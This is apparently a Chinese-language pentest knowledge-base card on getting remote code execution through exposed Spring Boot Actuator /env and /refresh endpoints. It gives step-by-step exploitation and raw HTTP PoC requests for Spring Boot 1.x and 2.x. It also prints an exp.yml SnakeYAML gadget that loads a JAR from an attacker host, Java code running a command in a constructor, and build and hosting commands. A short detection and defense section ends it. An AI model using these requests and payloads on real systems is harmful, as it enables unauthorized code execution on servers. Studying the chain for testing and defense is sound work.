---
id: web-java-framework-spring-actuator-bootstrap-location-yaml-rce
title: Spring Boot Actuator env + refresh 注入 bootstrap.location：远程 YAML 触发 SnakeYAML ScriptEngineManager RCE
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-actuator-bootstrap-location-yaml-rce
tags:
- java
- spring
- spring-boot
- actuator
- spring-cloud
- snakeyaml
- deserialization
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V207
  verified_at: '2026-11-07T01:59:42+08:00'
  notes: 已对照原文与全部61图核对：/env、/refresh、spring.cloud.bootstrap.location、DNSlog 回显（图52-54）、yaml-payload.jar/exp.yml/AwesomeScriptEngineFactory 弹计算器（图55-59）均与原文一致；图49 的 application.properties 注释佐证 1.0-1.4 默认暴露、1.5+/2.x 需额外配置。卡片为可操作场景而非情报资讯。未验证点：原文靶场为本地 1.4.7.RELEASE，未在真实目标复现；原文未标注受影响版本区间，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/java/framework/spring/web-java-framework-spring-actuator-bootstrap-location-yaml-rce/
draft: false
kb_aliases:
- SpringBoot Actuator RCE
- spring.cloud.bootstrap.location
- /env /refresh RCE
- yaml-payload
- SnakeYAML ScriptEngineManager
- Spring Cloud Config 远程 YAML RCE
---

## 一句话结论

Spring Boot Actuator 的 `/env` 端点未授权暴露时，可 POST `spring.cloud.bootstrap.location=http://attacker/exp.yml` 修改环境属性，再 POST `/refresh` 触发 Spring Cloud 重新加载外部配置；远程 YAML 中的 `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]` 会让 SnakeYAML 实例化 `ScriptEngineManager`，后者通过 URLClassLoader 加载攻击者 JAR 中的 `ScriptEngineFactory` 并执行其构造方法，形成 RCE。

## 原理

- **Actuator env 端点可写**：Spring Boot 1.x 默认暴露 `/env`、`/refresh` 等端点；2.x 需要显式 `management.endpoints.web.exposure.include=*`，且 `/actuator/env` 支持 JSON POST 修改属性（部分版本需 `management.endpoint.env.post.enabled=true`）。
- **bootstrap.location 的作用**：`spring.cloud.bootstrap.location` 指向 Spring Cloud 的外部 bootstrap 配置；`/refresh`（`ContextRefresher`）会重新加载该位置，支持 YAML/Properties。
- **SnakeYAML 的 `!!` 标签**：SnakeYAML 默认允许 `!!类名 [参数]` 语法实例化任意类。`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://.../yaml-payload.jar"]]]]` 会构造一个指向攻击者 JAR 的 URLClassLoader，并把它交给 `ScriptEngineManager`。
- **ScriptEngineManager 的加载行为**：`ScriptEngineManager` 会通过传入的 ClassLoader 查找 `META-INF/services/javax.script.ScriptEngineFactory`，实例化其中列出的 `ScriptEngineFactory` 实现；攻击者 JAR 中该类的构造方法/静态初始化即被执行，从而 RCE。
- **为什么能打通**：env 写入提供了“改配置”的能力，refresh 提供了“触发加载”的时机，SnakeYAML 的任意类实例化提供了 gadget；三者组合不需要任何认证（在 Actuator 未授权暴露的部署中）。
- **版本差异**：Spring Boot 1.x 默认暴露敏感端点；2.x 默认只暴露 health/info，需要额外配置。原文本地靶场为 Spring Boot 1.4.7.RELEASE 的 `springcloud-snakeyaml-rce` 项目，文中 1.x 用表单 POST `/env`，2.x 用 JSON POST `/actuator/env`。

## 触发条件

- Actuator `/env`（或 `/actuator/env`）可未授权访问且允许 POST 修改属性；`/refresh`（或 `/actuator/refresh`）可访问。
- 应用引入 Spring Cloud，`spring.cloud.bootstrap.location` 属性生效；目标能出站访问攻击者 HTTP 服务。
- 使用的 SnakeYAML 版本未启用安全构造器（默认 `new Yaml().load()` 即可）。
- 攻击者能托管 `exp.yml` 与 `yaml-payload.jar`，并能让目标加载。

## 利用步骤

1. 版本识别：访问 `/env` 有数据 → Spring Boot 1.x；`/actuator/env` 有数据 → 2.x。
2. 写入 bootstrap.location：
   - 1.x：`POST /env`，`Content-Type: application/x-www-form-urlencoded`，body `spring.cloud.bootstrap.location=http://attacker/exp.yml`；
   - 2.x：`POST /actuator/env`，JSON `{"name":"spring.cloud.bootstrap.location","value":"http://attacker/exp.yml"}`。
3. 访问 `/env` 确认属性已写入；可用 DNSlog 先验证目标会请求该 URL。
4. 触发刷新：1.x `POST /refresh`；2.x `POST /actuator/refresh`；目标会下载并解析 `exp.yml`，DNSlog 收到请求说明 YAML 被加载。
5. 准备 `yaml-payload.jar`：修改 `AwesomeScriptEngineFactory` 的构造方法为要执行的命令（如 `Runtime.getRuntime().exec("calc")`），`javac` 编译后 `jar -cvf yaml-payload.jar -C src/ .`；同目录放 `exp.yml`：
   ```yaml
   !!javax.script.ScriptEngineManager [
     !!java.net.URLClassLoader [[
       !!java.net.URL ["http://attacker/yaml-payload.jar"]
     ]]
   ]
   ```
6. 在攻击机启动 `python -m http.server 80`，把 `spring.cloud.bootstrap.location` 指向 `http://attacker/exp.yml`，再次 `/refresh`，目标加载 JAR 并执行命令。

## PoC

```http
### 1.x 写入属性
POST /env HTTP/1.1
Host: target:9092
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://attacker/exp.yml
```

```http
### 1.x 触发刷新
POST /refresh HTTP/1.1
Host: target:9092
Content-Type: application/x-www-form-urlencoded
```

```json
// 2.x 写入属性
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://attacker/exp.yml"}
```

```yaml
# exp.yml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker/yaml-payload.jar"]
  ]]
]
```

```java
// AwesomeScriptEngineFactory 构造方法中执行命令
public AwesomeScriptEngineFactory() {
    try {
        Runtime.getRuntime().exec("calc");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
python -m http.server 80
```

说明：PoC 为原文本地靶场流程的结构化复现，未在真实目标执行；原文用 DNSlog 验证 `/refresh` 加载远程 YAML，再用 `yaml-payload.jar` 弹出计算器。原文标题/正文有“SpringBoot 2.x”表述，但实际靶场为 1.4.7.RELEASE，2.x 需额外暴露配置，卡内已区分。

## 变体与关联

- 变体（端点路径）：1.x `/env` + `/refresh`；2.x `/actuator/env` + `/actuator/refresh`，且需 `management.endpoints.web.exposure.include=*`、`management.endpoint.env.post.enabled=true`。
- 变体（配置载体）：`spring.cloud.bootstrap.location` 加载远程 YAML；也可用其他可加载外部配置的属性/端点（如 Spring Cloud Config、Eureka、Config Server）。
- 变体（gadget）：SnakeYAML `!!javax.script.ScriptEngineManager` + URLClassLoader；其他 `!!` 类 gadget（如 `!!java.lang.ProcessBuilder` 在部分版本受限）；JNDI/JDK 版本影响。
- 关联：[[web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce]]（同一 SnakeYAML ScriptEngineManager gadget，但入口是主题 ZIP 的 theme.yaml 上传）；[[web-java-framework-spring-actuator-env-config-backup-path]]（Actuator env 未授权信息泄露）；[[web-java-expression-spel-spring-cloud-gateway-22947-actuator-route-rce]]（Actuator 写属性触发 SpEL）；[[web-java-framework-spring-actuator-heapdump-credential-leak]]。
- 边界：Actuator 端点被鉴权/关闭、目标不能出站、SnakeYAML 启用安全构造器、或 Spring Cloud 未引入时，该链不成立。

## 检测与防御

- 检测：对 `/env`、`/actuator/env`、`/refresh`、`/actuator/refresh` 的未授权 POST；请求体含 `spring.cloud.bootstrap.location`；目标对任意外部 URL 的 HTTP 请求；加载远程 YAML 后出现的异常/进程创建。
- 防御：生产环境关闭或鉴权 Actuator 敏感端点（仅暴露 health/info）；设置 `management.endpoints.web.exposure.include` 白名单；禁用 env POST；升级 Spring Boot/Spring Cloud/SnakeYAML 并使用安全构造器；限制应用出站访问；WAF 拦截 `spring.cloud.bootstrap.location` 与可疑 YAML 标签。
